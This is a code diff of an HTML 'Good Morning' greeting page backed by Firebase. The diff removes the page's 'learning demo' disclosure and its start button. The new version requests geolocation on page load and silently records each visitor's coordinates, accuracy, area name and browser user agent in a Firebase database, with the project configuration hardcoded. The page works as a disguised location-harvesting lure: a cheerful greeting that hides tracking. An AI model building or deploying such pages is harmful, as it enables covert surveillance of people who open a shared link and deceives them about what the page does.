@@ -2,130 +2,71 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Good Morning – Live Location</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Good Morning – Location Logger</title>
   <style>
     body {
       font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       margin: 0;
       min-height: 100vh;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       background: linear-gradient(135deg, #ffecd2, #fcb69f);
-      color: #333;
+      color: #222;
     }
-
     .card {
-      background: rgba(255, 255, 255, 0.95);
-      border-radius: 18px;
-      padding: 20px 22px;
+      background: rgba(255, 255, 255, 0.92);
+      padding: 20px 24px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
       max-width: 420px;
-      width: 92%;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      width: 90%;
+      text-align: center;
     }
-
     h1 {
-      margin: 0 0 10px;
+      margin: 0 0 8px;
       font-size: 1.8rem;
-      text-align: center;
-      color: #ff7a00;
     }
-
-    .subtitle {
-      text-align: center;
-      margin-bottom: 16px;
-      font-size: 0.95rem;
-      color: #555;
-    }
-
-    .status {
-      margin-bottom: 10px;
-      font-size: 0.9rem;
-      color: #333;
-    }
-
-    .label {
+    .location-line {
       font-weight: 600;
+      margin-top: 8px;
     }
-
-    .value {
-      font-weight: 400;
-    }
-
     .small {
       font-size: 0.85rem;
-      color: #666;
+      color: #555;
+      margin-top: 6px;
+      word-break: break-word;
     }
-
-    button {
-      width: 100%;
-      padding: 10px 12px;
-      margin-top: 14px;
-      border-radius: 999px;
-      border: none;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      background: #ff7a00;
-      color: white;
-      box-shadow: 0 6px 15px rgba(255, 122, 0, 0.35);
-    }
-
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      box-shadow: none;
-    }
-
-    .line {
-      margin: 4px 0;
-    }
-
-    .mono {
-      font-family: "SF Mono", Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+    .status {
+      margin-top: 10px;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Good Morning ☀️</h1>
-    <div class="subtitle">
-      Live greeting from your current location
+    <div class="location-line">
+      Location: <span id="address">Detecting your location…</span>
     </div>
-
-    <div id="statusMsg" class="status">
-      Tap the button below to share your live location.
-    </div>
-
-    <div class="line">
-      <span class="label">Location:</span>
-      <span id="addressLine" class="value">—</span>
-    </div>
-
-    <div class="line small">
-      <span class="label">Lat / Lng:</span>
-      <span id="latLngLine" class="mono">—</span>
-    </div>
-
-    <div class="line small">
-      <span class="label">Last update:</span>
-      <span id="timeLine">—</span>
-    </div>
-
-    <button id="startBtn">Start live tracking</button>
-    <div class="small" style="margin-top:8px;">
-      For learning demo only – location is stored in Firebase Realtime Database.
-    </div>
+    <div class="small" id="coords"></div>
+    <div class="status" id="statusMsg">Waiting for permission…</div>
   </div>
 
-  <!-- All JS + Firebase in one module for easy copy-paste -->
+  <!-- Firebase + app logic -->
   <script type="module">
-    /*************** 1. Firebase imports & init ***************/
+    // 1) IMPORT FIREBASE SDKs (CDN)
     import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
-    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
+    import {
+      getDatabase,
+      ref,
+      push,
+      set,
+      serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
 
-    // Your Firebase config (from Firebase console)
+    // 2) YOUR FIREBASE CONFIG (from Firebase console)
     const firebaseConfig = {
       apiKey: "AIzaSyDBUM7Qzl-KOZJMFUpuDH1CerJdsm_eKFM",
       authDomain: "loc-demo-22c3d.firebaseapp.com",
@@ -133,130 +74,116 @@
       storageBucket: "loc-demo-22c3d.firebasestorage.app",
       messagingSenderId: "603283450312",
       appId: "1:603283450312:web:7bf9c8a9fde7d0c26778fd",
-      // NOTE: For Realtime DB we use the URL set in the console rules,
-      // but JS SDK reads it from project config automatically.
+      // IMPORTANT: add your Realtime DB URL here
+      databaseURL: "https://loc-demo-22c3d-default-rtdb.asia-southeast1.firebasedatabase.app"
     };
 
+    // 3) INITIALIZE FIREBASE
     const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app); // Realtime Database instance
+    const db = getDatabase(app);
 
-    /*************** 2. DOM elements ***************/
-    const statusMsg  = document.getElementById("statusMsg");
-    const addressLine = document.getElementById("addressLine");
-    const latLngLine  = document.getElementById("latLngLine");
-    const timeLine    = document.getElementById("timeLine");
-    const startBtn    = document.getElementById("startBtn");
+    // 4) DOM ELEMENTS
+    const addressEl = document.getElementById("address");
+    const coordsEl = document.getElementById("coords");
+    const statusEl = document.getElementById("statusMsg");
 
-    let watchId = null;
-
-    /*************** 3. Helper: save to Firebase ***************/
-    async function saveLocationToFirebase(lat, lng, address) {
-      try {
-        const ts = new Date().toISOString();
-
-        // each entry under /locations is a new push ID
-        const locRef = push(ref(db, "locations"));
-        await set(locRef, {
-          lat,
-          lng,
-          address,
-          timestamp: ts,
-          userAgent: navigator.userAgent || "unknown"
-        });
-        // no UI message needed; silent success
-      } catch (err) {
-        console.error("Error writing to Firebase:", err);
-      }
+    // 5) SAVE TO FIREBASE
+    function saveLocationToFirebase(data) {
+      const locationsRef = ref(db, "locations");
+      const newLocRef = push(locationsRef); // creates /locations/<randomId>
+      return set(newLocRef, {
+        ...data,
+        createdAt: serverTimestamp()
+      });
     }
 
-    /*************** 4. Helper: reverse geocode ***************/
+    // 6) REVERSE GEOCODING (lat/lng → area name)
     async function reverseGeocode(lat, lng) {
       try {
-        const url =
-          `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`;
-        const res = await fetch(url, {
+        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`;
+        const resp = await fetch(url, {
           headers: {
-            // polite identification (some browsers may ignore this header)
             "Accept-Language": "en"
           }
         });
-        if (!res.ok) throw new Error("Reverse geocode failed");
-        const data = await res.json();
-
-        // Try to form a nice area-level address
-        const addr = data.address || {};
-        const pieces = [
-          addr.suburb,
-          addr.neighbourhood,
-          addr.village,
-          addr.town,
-          addr.city,
-          addr.state,
-          addr.country
-        ].filter(Boolean);
-
-        if (pieces.length > 0) {
-          return pieces.join(", ");
-        }
-        return data.display_name || "Address not available";
-      } catch (err) {
-        console.warn("Reverse geocoding error:", err);
-        return "Address lookup failed";
+        const json = await resp.json();
+        // Pick a nice human-readable part
+        return (
+          json.address?.suburb ||
+          json.address?.neighbourhood ||
+          json.address?.city ||
+          json.address?.town ||
+          json.address?.village ||
+          json.display_name ||
+          `${lat.toFixed(5)}, ${lng.toFixed(5)}`
+        );
+      } catch (e) {
+        console.error("Reverse geocode failed:", e);
+        return `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
       }
     }
 
-    /*************** 5. Geolocation success & error ***************/
-    async function handlePosition(position) {
-      const lat = position.coords.latitude.toFixed(6);
-      const lng = position.coords.longitude.toFixed(6);
-      const now = new Date();
+    // 7) GEOLOCATION SUCCESS
+    async function handlePosition(pos) {
+      const { latitude, longitude, accuracy } = pos.coords;
 
-      statusMsg.textContent = "Good Morning from your live location! 🌍";
-      latLngLine.textContent = `${lat}, ${lng}`;
-      timeLine.textContent = now.toLocaleString();
+      coordsEl.textContent =
+        `Lat: ${latitude.toFixed(5)}, Lng: ${longitude.toFixed(5)} (±${Math.round(accuracy)} m)`;
+      statusEl.textContent = "Got location, saving to Firebase…";
 
-      // Get a nice human-readable address
-      const address = await reverseGeocode(lat, lng);
-      addressLine.textContent = address;
+      // Show area name
+      const niceAddress = await reverseGeocode(latitude, longitude);
+      addressEl.textContent = niceAddress;
 
-      // Save to Firebase
-      saveLocationToFirebase(lat, lng, address);
+      // Save raw data into Firebase
+      const payload = {
+        lat: latitude,
+        lng: longitude,
+        accuracy,
+        address: niceAddress,
+        userAgent: navigator.userAgent,
+        time: new Date().toISOString()
+      };
+
+      try {
+        await saveLocationToFirebase(payload);
+        statusEl.textContent = "Location saved in Firebase ✅";
+      } catch (err) {
+        console.error("Firebase write error:", err);
+        statusEl.textContent = "Error saving to Firebase ❌ (see browser console)";
+      }
     }
 
+    // 8) GEOLOCATION ERROR
     function handleError(err) {
-      console.error("Geolocation error:", err);
-
+      console.error(err);
       switch (err.code) {
         case err.PERMISSION_DENIED:
-          statusMsg.textContent =
-            "Permission denied. Please allow location access to see Good Morning from your place.";
+          statusEl.textContent =
+            "Permission denied. Please allow location access and reload.";
           break;
         case err.POSITION_UNAVAILABLE:
-          statusMsg.textContent = "Location information is unavailable.";
+          statusEl.textContent = "Location information is unavailable.";
           break;
         case err.TIMEOUT:
-          statusMsg.textContent = "Location request timed out. Try again.";
+          statusEl.textContent = "Location request timed out. Try again.";
           break;
         default:
-          statusMsg.textContent = "Unexpected error getting location.";
+          statusEl.textContent = "Unexpected error getting location.";
       }
+      addressEl.textContent = "—";
     }
 
-    /*************** 6. Start / stop tracking ***************/
-    function startTracking() {
-      if (!("geolocation" in navigator)) {
-        statusMsg.textContent = "Geolocation is not supported in this browser.";
+    // 9) START ON LOAD
+    function start() {
+      if (!navigator.geolocation) {
+        statusEl.textContent = "Geolocation is not supported on this device.";
         return;
       }
 
-      if (watchId !== null) {
-        // already tracking
-        return;
-      }
+      statusEl.textContent = "Requesting your location…";
 
-      statusMsg.textContent = "Requesting location permission…";
-
-      watchId = navigator.geolocation.watchPosition(
+      navigator.geolocation.getCurrentPosition(
         handlePosition,
         handleError,
         {
@@ -265,15 +192,9 @@
           maximumAge: 0
         }
       );
-
-      startBtn.disabled = true;
-      startBtn.textContent = "Tracking live location…";
     }
 
-    startBtn.addEventListener("click", startTracking);
-
-    // Optional: start automatically when page loads (comment out if you don’t want this)
-    // startTracking();
+    start();
   </script>
 </body>
 </html>
